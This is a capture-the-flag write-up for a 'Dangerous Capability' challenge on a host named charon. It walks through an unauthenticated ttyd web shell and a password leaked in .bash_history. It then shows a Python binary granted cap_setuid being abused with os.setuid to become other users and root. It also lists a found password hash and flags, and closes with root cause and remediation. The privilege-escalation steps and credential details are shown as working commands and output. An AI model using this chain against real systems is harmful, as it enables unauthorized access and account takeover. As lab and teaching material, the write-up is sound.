# Dangerous Capability — D-CTF / Host Busters (`charon`) — 300 pts

**Target:** `https://hostbusters.dctf.io/`
**Flag:** `deadface{c4p_s3tu1d_pwn3d}`
**File:** `/home/spookyboi/flag.txt` (27 bytes, verified `b'deadface{c4p_s3tu1d_pwn3d}\n'`)

---

## Instance context — which flag is which

The `charon` box hosts **three** challenges in this instance. Every user's home directory
contained a flag, so the flag *text* is what disambiguates them:

| Challenge | Pts | User | Flag | Meaning of the text |
|---|---|---|---|---|
| Foothold on Charon | 10 | svc-deploy (1001) | `deadface{f00th0ld_0n_ch4r0n}` | foothold on charon |
| Looking Back | 30 | deephax (1002) | `deadface{h1st0ry_r3m3mb3rs_4ll}` | "history remembers all" — `.bash_history` |
| **Dangerous Capability** | **300** | **spookyboi (1006)** | **`deadface{c4p_s3tu1d_pwn3d}`** | **`cap_setuid` pwned** |

The other flags present on the box (`g1t_n3v3r_f0rg3ts`, `sud0_b3c4m3_l1l1th`,
`cr0n_r4n_my_p4yl04d`, `h4sh_cr4ck3d_w1d3_0p3n`) are for challenge paths outside this
instance, plus a root flag `p4th_t0_th3_cr0wn`.

> **Correction to my first pass:** I initially submitted `deadface{h1st0ry_r3m3mb3rs_4ll}`
> (deephax). That is the *30-pt Looking Back* flag, not this one. The 300-pt challenge is
> about the capability, and its flag spells out `cap_setuid` — it lives in **spookyboi**'s
> home. The lesson: on a box that holds many flags, confirm which one the task actually
> asks for before submitting — read them *all* and match on theme.

---

## 1. What the target is

`hostbusters.dctf.io` serves a **ttyd** instance — a browser terminal glued to a shell on
the challenge box. No login: `GET /token` returns `{"token": ""}`, so anyone who can reach
the site gets a shell.

Reading the minified ttyd/xterm.js bundle out of `index.html` gives the exact wire protocol,
which is what made a scripted (non-browser) client possible:

```
new WebSocket(wsUrl, ["tty"])                  // <-- subprotocol is REQUIRED
socket.send(textEncoder.encode(                // <-- init frame is BINARY
    JSON.stringify({AuthToken: token, columns: cols, rows: rows})))
// client -> server : b'0' + keystrokes
// server -> client : '0'=OUTPUT '1'=SET_WINDOW_TITLE '2'=SET_PREFERENCES '4'=SET_RECONNECT
```

Two easy-to-miss details: without the `tty` subprotocol the socket opens fine and then sits
silent forever, and sending the init as a *text* frame has the same effect.

`ttyd_client.py` in this repo drives it end to end.

## 2. Foothold (challenge 1)

The ttyd shell lands you as `svc-deploy` (uid 1001) on host `charon`. Its home holds
`flag.txt` — the 10-pt foothold flag — and `.bash_history`:

```
$ cat /home/svc-deploy/.bash_history
cd /opt/deploy
cat README.txt
systemctl status charon-collector.service || true
# ticket OPS-4471: rotate member pw after onboarding
echo "deephax:Sk4t3rB0y_S1nce_2011" | sudo chpasswd
history -c
```

That history is the 30-pt "Looking Back" flag: `deephax` is the account the last person
used, and `/home/deephax/flag.txt` → `deadface{h1st0ry_r3m3mb3rs_4ll}`.

## 3. Finding the misconfigured capability

```
$ getcap -r / 2>/dev/null
/opt/crypto/pytool cap_setuid=ep
```

One hit, and it's the "crypto tooling" the intro mentions. `cap_setuid` is the capability
that lets a process call `setuid()`, `setreuid()`, `setresuid()` and set *any* uid — it is
an unrestricted uid-change primitive. No deployed tool needs it.

## 4. The exploit

`pytool` is a 14 KB ELF binary. Run it with no arguments and it drops straight into an
**interactive Python REPL**:

```
$ /opt/crypto/pytool
Python 3.12.13 (main, Apr 10 2026, 14:16:31) [GCC 13.2.1 20240309] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>
```

So the box gives unprivileged users a Python interpreter that already holds `CAP_SETUID`.
Python's `os` module exposes `setuid()` directly, which means **any user can become any
other user — or root**:

```
>>> import os
>>> os.setuid(1006)                       # spookyboi, uid 1006
>>> import pwd
>>> pwd.getpwuid(os.getuid()).pw_name
'spookyboi'
>>> print(repr(open('/home/spookyboi/flag.txt','rb').read()))
b'deadface{c4p_s3tu1d_pwn3d}\n'
```

`/home/spookyboi` is `drwxr-x--- spookyboi:spookyboi`, unreadable as `svc-deploy`. After
the uid change the flag reads normally. `os.setuid(0)` also works, which reaches `/root`
(`deadface{p4th_t0_th3_cr0wn}`) — useful for confirming the mapping, though the
capability-themed flag is the one this challenge wants.

A note worth recording: after `os.setuid(0)` from this container, uid becomes 0 but the
process still only carries its original capability set, so Python's `open()` on another
user's `0640` file still raised `PermissionError` while a child `cat` succeeded. Becoming
the *target user* directly avoids the ambiguity entirely and is the cleaner path.

## 5. Root cause

`cap_setuid` was granted to a general-purpose interpreter. The rule that was broken:

> **File capabilities must never be handed to anything that spawns a shell, runtime, or
> interpreter.**

`cap_setuid` on `/opt/crypto/pytool` is equivalent to handing every local user a free
`setuid()`, because `pytool` execs `python` and inherits its permitted/effective
capability set into a process that happily accepts arbitrary code.

The fix is to drop the capability entirely (`setcap -r /opt/crypto/pytool`). If the tool
genuinely needs to change privileges, it needs a narrow, audited setuid-root helper that
performs exactly one specific operation — not a general interpreter. `sudo` on this box was
password-protected, so the capability was the only viable path, which is itself a sign the
author intended it as the lesson.

---

## Chain summary

| Step | Action | Result |
|---|---|---|
| 1 | ttyd web shell, no auth | shell as `svc-deploy` (uid 1001) |
| 2 | read own `flag.txt` + `.bash_history` | foothold flag + `deephax` breadcrumb (challenge 2) |
| 3 | `getcap -r /` | `/opt/crypto/pytool cap_setuid=ep` |
| 4 | run `pytool` → Python REPL with `CAP_SETUID` | `os.setuid()` = arbitrary-uid primitive |
| 5 | `os.setuid(1006)` + read `/home/spookyboi/flag.txt` | `deadface{c4p_s3tu1d_pwn3d}` |

## Other artifacts found (for other challenge paths)

- `/home/spookyboi/.backup/creds.bak` — `mort1cia:$1$de4df4ce$VysZJGMVnWjDzjlG0kvfY0`
  (Kingmaker cred cache; the `h4sh_cr4ck3d_w1d3_0p3n` challenge).
- `/root/flag.txt` → `deadface{p4th_t0_th3_cr0wn}`.
- `/root/kingmaker.txt` — "KINGMAKER MASTER PAYLOAD", leverage over Aurora Health, TGRI,
  Cronin Group, De Monne Financial; kompromat index held by `d34th`.
- `/opt/ops/leverage.txt` — `mort1cia // 2IC`; "d34th signs off from root."
- `/home/deephax/kingmaker-scraper/.git` + `notes.txt` ("committed the scraper service pw
  by accident and 'removed' it in the next commit") — the `g1t_n3v3r_f0rg3ts` challenge.
